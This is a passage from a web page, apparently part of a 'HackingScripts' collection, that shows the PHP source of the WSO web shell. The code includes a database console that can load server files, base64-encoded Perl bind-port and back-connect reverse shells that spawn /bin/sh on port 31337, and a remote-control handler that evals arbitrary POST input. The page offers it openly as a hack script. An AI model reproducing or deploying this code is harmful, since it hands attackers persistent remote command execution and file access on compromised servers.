                                <span class="k">foreach</span><span class="p">(</span><span class="nv">$item</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$value</span><span class="p">)</span>
                                    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;th&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$key</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/th&amp;gt;&#39;</span><span class="p">;</span>
                                <span class="nb">reset</span><span class="p">(</span><span class="nv">$item</span><span class="p">);</span>
                                <span class="nv">$title</span><span class="o">=</span><span class="k">true</span><span class="p">;</span>
                                <span class="k">echo</span> <span class="s1">&#39;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&#39;</span><span class="p">;</span>
                                <span class="nv">$line</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
                            <span class="p">}</span>
                            <span class="k">echo</span> <span class="s1">&#39;&amp;lt;tr class=&quot;l&#39;</span><span class="o">.</span><span class="nv">$line</span><span class="o">.</span><span class="s1">&#39;&quot;&amp;gt;&#39;</span><span class="p">;</span>
                            <span class="nv">$line</span> <span class="o">=</span> <span class="nv">$line</span><span class="o">==</span><span class="mi">1</span><span class="o">?</span><span class="mi">2</span><span class="o">:</span><span class="mi">1</span><span class="p">;</span>
                            <span class="k">foreach</span><span class="p">(</span><span class="nv">$item</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
                                <span class="k">if</span><span class="p">(</span><span class="nv">$value</span> <span class="o">==</span> <span class="k">null</span><span class="p">)</span>
                                    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;td&amp;gt;&amp;lt;i&amp;gt;null&amp;lt;/i&amp;gt;&amp;lt;/td&amp;gt;&#39;</span><span class="p">;</span>
                                <span class="k">else</span>
                                    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;td&amp;gt;&#39;</span><span class="o">.</span><span class="nb">nl2br</span><span class="p">(</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$value</span><span class="p">))</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/td&amp;gt;&#39;</span><span class="p">;</span>
                            <span class="p">}</span>
                            <span class="k">echo</span> <span class="s1">&#39;&amp;lt;/tr&amp;gt;&#39;</span><span class="p">;</span>
                        <span class="p">}</span>
                        <span class="k">echo</span> <span class="s1">&#39;&amp;lt;/table&amp;gt;&#39;</span><span class="p">;</span>
                    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                        <span class="k">echo</span> <span class="s1">&#39;&amp;lt;div&amp;gt;&amp;lt;b&amp;gt;Error:&amp;lt;/b&amp;gt; &#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">error</span><span class="p">())</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/div&amp;gt;&#39;</span><span class="p">;</span>
                    <span class="p">}</span>
                <span class="p">}</span>
                <span class="k">echo</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;form onsubmit=&#39;d.sf.p1.value=</span><span class="se">\&quot;</span><span class="s2">query</span><span class="se">\&quot;</span><span class="s2">;d.sf.p2.value=this.query.value;document.sf.submit();return false;&#39;&amp;gt;&amp;lt;textarea name=&#39;query&#39; style=&#39;width:100%;height:100px&#39;&amp;gt;&quot;</span><span class="p">;</span>
                <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;loadfile&#39;</span><span class="p">))</span>
                    <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]);</span>
                <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/textarea&amp;gt;&amp;lt;br/&amp;gt;&amp;lt;input type=submit value=&#39;Execute&#39;&amp;gt;&quot;</span><span class="p">;</span>
                <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/table&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;br/&amp;gt;&quot;</span><span class="p">;</span>
            <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;mysql&#39;</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">query</span><span class="p">(</span><span class="s2">&quot;SELECT 1 FROM mysql.user WHERE concat(`user`, &#39;@&#39;, `host`) = USER() AND `File_priv` = &#39;y&#39;&quot;</span><span class="p">);</span>
                <span class="k">if</span><span class="p">(</span><span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">fetch</span><span class="p">())</span>
                    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;form onsubmit=&#39;d.sf.p1.value=</span><span class="se">\&quot;</span><span class="s2">loadfile</span><span class="se">\&quot;</span><span class="s2">;document.sf.p2.value=this.f.value;document.sf.submit();return false;&#39;&amp;gt;&amp;lt;span&amp;gt;Load file&amp;lt;/span&amp;gt; &amp;lt;input  class=&#39;toolsInp&#39; type=text name=f&amp;gt;&amp;lt;input type=submit value=&#39;&amp;gt;&amp;gt;&#39;&amp;gt;&amp;lt;/form&amp;gt;&quot;</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;loadfile&#39;</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">loadFile</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]);</span>
                <span class="k">echo</span> <span class="s1">&#39;&amp;lt;pre class=ml1&amp;gt;&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/pre&amp;gt;&#39;</span><span class="p">;</span>
            <span class="p">}</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">error</span><span class="p">());</span>
    <span class="p">}</span>
    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;/div&amp;gt;&#39;</span><span class="p">;</span>
    <span class="nx">wsoFooter</span><span class="p">();</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">actionNetwork</span><span class="p">()</span> <span class="p">{</span>
    <span class="nx">wsoHeader</span><span class="p">();</span>
    <span class="nv">$back_connect_p</span><span class="o">=</span><span class="s2">&quot;IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7&quot;</span><span class="p">;</span>
    <span class="nv">$bind_port_p</span><span class="o">=</span><span class="s2">&quot;IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=&quot;</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;h1&amp;gt;Network tools&amp;lt;/h1&amp;gt;&amp;lt;div class=content&amp;gt;</span>

<span class="s2">   &amp;lt;form name=&#39;nfp&#39; onSubmit=</span><span class="se">\&quot;</span><span class="s2">g(null,null,&#39;bpp&#39;,this.port.value);return false;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;</span>
<span class="s2">   &amp;lt;span&amp;gt;Bind port to /bin/sh 1&amp;lt;/span&amp;gt;&amp;lt;br/&amp;gt;</span>
<span class="s2">   Port: &amp;lt;input type=&#39;text&#39; name=&#39;port&#39; value=&#39;31337&#39;&amp;gt; &amp;lt;input type=submit value=&#39;&amp;gt;&amp;gt;&#39;&amp;gt;</span>
<span class="s2">   &amp;lt;/form&amp;gt;</span>
<span class="s2">   &amp;lt;form name=&#39;nfp&#39; onSubmit=</span><span class="se">\&quot;</span><span class="s2">g(null,null,&#39;bcp&#39;,this.server.value,this.port.value);return false;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;</span>
<span class="s2">   &amp;lt;span&amp;gt;Back-connect  1&amp;lt;/span&amp;gt;&amp;lt;br/&amp;gt;</span>
<span class="s2">   Server: &amp;lt;input type=&#39;text&#39; name=&#39;server&#39; value=&#39;&quot;</span><span class="o">.</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">]</span> <span class="o">.</span><span class="s2">&quot;&#39;&amp;gt; Port: &amp;lt;input type=&#39;text&#39; name=&#39;port&#39; value=&#39;31337&#39;&amp;gt; &amp;lt;input type=submit value=&#39;&amp;gt;&amp;gt;&#39;&amp;gt;</span>

<span class="s2">   &amp;lt;/form&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="p">{</span>
        <span class="k">function</span> <span class="nf">cf</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span><span class="nv">$t</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$w</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">)</span> <span class="k">or</span> <span class="o">@</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;file_put_contents&#39;</span><span class="p">);</span>
            <span class="k">if</span><span class="p">(</span><span class="nv">$w</span><span class="p">){</span>
                <span class="o">@</span><span class="nb">fwrite</span><span class="p">(</span><span class="nv">$w</span><span class="p">,</span><span class="o">@</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$t</span><span class="p">));</span>
                <span class="o">@</span><span class="nb">fclose</span><span class="p">(</span><span class="nv">$w</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;bpp&#39;</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">cf</span><span class="p">(</span><span class="s2">&quot;/tmp/bp.pl&quot;</span><span class="p">,</span><span class="nv">$bind_port_p</span><span class="p">);</span>
            <span class="nv">$out</span> <span class="o">=</span> <span class="nx">wsoEx</span><span class="p">(</span><span class="s2">&quot;perl /tmp/bp.pl &quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot; 1&amp;gt;/dev/null 2&amp;gt;&amp;1 &amp;&quot;</span><span class="p">);</span>
            <span class="k">echo</span> <span class="s2">&quot;&amp;lt;pre class=ml1&amp;gt;</span><span class="si">$out\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="nx">wsoEx</span><span class="p">(</span><span class="s2">&quot;ps aux | grep bp.pl&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/pre&amp;gt;&quot;</span><span class="p">;</span>
            <span class="nb">unlink</span><span class="p">(</span><span class="s2">&quot;/tmp/bp.pl&quot;</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;bcp&#39;</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">cf</span><span class="p">(</span><span class="s2">&quot;/tmp/bc.pl&quot;</span><span class="p">,</span><span class="nv">$back_connect_p</span><span class="p">);</span>
            <span class="nv">$out</span> <span class="o">=</span> <span class="nx">wsoEx</span><span class="p">(</span><span class="s2">&quot;perl /tmp/bc.pl &quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot; &quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot; 1&amp;gt;/dev/null 2&amp;gt;&amp;1 &amp;&quot;</span><span class="p">);</span>
            <span class="k">echo</span> <span class="s2">&quot;&amp;lt;pre class=ml1&amp;gt;</span><span class="si">$out\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="nx">wsoEx</span><span class="p">(</span><span class="s2">&quot;ps aux | grep bc.pl&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/pre&amp;gt;&quot;</span><span class="p">;</span>
            <span class="nb">unlink</span><span class="p">(</span><span class="s2">&quot;/tmp/bc.pl&quot;</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;/div&amp;gt;&#39;</span><span class="p">;</span>
    <span class="nx">wsoFooter</span><span class="p">();</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">actionRC</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span> <span class="p">{</span>
        <span class="nv">$a</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
            <span class="s2">&quot;uname&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nb">php_uname</span><span class="p">(),</span>
            <span class="s2">&quot;php_version&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nb">phpversion</span><span class="p">(),</span>
            <span class="s2">&quot;wso_version&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nx">WSO_VERSION</span><span class="p">,</span>
            <span class="s2">&quot;safemode&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">&#39;safe_mode&#39;</span><span class="p">)</span>
        <span class="p">);</span>
        <span class="k">echo</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]);</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">if</span><span class="p">(</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">])</span> <span class="p">)</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$default_action</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;action&#39;</span> <span class="o">.</span> <span class="nv">$default_action</span><span class="p">))</span>
        <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$default_action</span><span class="p">;</span>
    <span class="k">else</span>
        <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;SecInfo&#39;</span><span class="p">;</span>
<span class="k">if</span><span class="p">(</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;action&#39;</span> <span class="o">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">])</span> <span class="p">)</span>
    <span class="nb">call_user_func</span><span class="p">(</span><span class="s1">&#39;action&#39;</span> <span class="o">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]);</span>
<span class="k">exit</span><span class="p">;</span>
<span class="cp">?&gt;</span><span class="x"></span></code></pre></div>



        </section>

        <aside id="sidebar">
          <a href="/HackingScripts/upload/" class="button">
            <small>Upload</small>
            a file
          </a>


          <a href="/HackingScripts/scripts/" class="button">
            <small>The entire list of</small>
            hack scripts
          </a>
          <!--
          <p class="repo-owner"><a href="https://github.com/jasonlong/architect-theme">architect-theme</a> is maintained by <a href="https://github.com/jasonlong">jasonlong</a>.</p>

          <p class="repo-owner"><a href="https://github.com/pietromenna/jekyll-architect-theme">jekyll-architect-theme</a> is maintained by <a href="https://github.com/pietromenna">pietromenna</a>.</p>

          <p>This page was generated by <a href="https://pages.github.com">GitHub Pages</a> using the Architect theme by <a href="https://twitter.com/jasonlong">Jason Long</a>.</p>
      -->
        </aside>

      </div>
    </div>

  </body>
</html>
